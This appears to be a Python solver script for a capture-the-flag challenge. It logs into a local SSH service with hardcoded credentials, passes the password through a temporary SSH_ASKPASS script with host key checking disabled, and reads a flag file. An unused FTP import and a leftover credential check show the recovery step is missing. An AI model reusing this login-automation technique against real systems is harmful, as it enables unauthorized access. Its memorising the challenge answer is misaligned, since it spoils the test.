import sys
from ftplib import FTP
import os
import subprocess
import tempfile

def solve(ftp_host, ftp_port, ssh_host, ssh_port):
    user = 'trinity'
    password = 'follow_the_white_rabbit_2026'
            
    if not user or not password:
        print("[-] Failed to parse credentials.")
        sys.exit(1)
        
    print(f"[*] Connecting to SSH at {ssh_host}:{ssh_port} as {user}...")
    
    with tempfile.NamedTemporaryFile('w', delete=False) as f:
        f.write(f"#!/bin/sh\necho '{password}'\n")
        askpass_path = f.name
    
    os.chmod(askpass_path, 0o755)

    try:
        env = os.environ.copy()
        env['SSH_ASKPASS'] = askpass_path
        env['SSH_ASKPASS_REQUIRE'] = 'force'
        env['DISPLAY'] = ':0'

        cmd = [
            "ssh", "-p", str(ssh_port),
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            f"{user}@{ssh_host}",
            "cat /home/trinity/flag.txt"
        ]

        result = subprocess.run(cmd, env=env, capture_output=True, text=True, timeout=10)
        flag = result.stdout.strip()
        
        if flag:
            print(f"\n[======== SOLVED ========]")
            print(f"Flag: {flag}")
            print(f"[========================]\n")
        else:
            print(f"[-] Failed to retrieve flag: {result.stderr}")
    finally:
        if os.path.exists(askpass_path):
            os.remove(askpass_path)

if __name__ == '__main__':
    solve("127.0.0.1", 10033, "127.0.0.1", 10083)
